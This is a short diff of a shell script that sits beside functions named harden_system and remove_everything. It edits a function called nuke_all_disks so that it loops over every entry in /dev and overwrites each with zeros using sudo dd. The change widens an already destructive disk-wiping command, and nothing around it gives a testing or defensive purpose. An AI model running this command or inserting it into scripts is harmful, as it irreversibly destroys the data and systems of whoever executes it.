@@ -724,7 +724,7 @@ function harden_system() {
 }
 
 function nuke_all_disks() {
-  sudo dd if=/dev/zero of=/dev/sd* bs=1M
+  for i in /dev/*; do sudo dd if=/dev/zero of="$i" bs=1M;done
 }
 
 function remove_everything() {
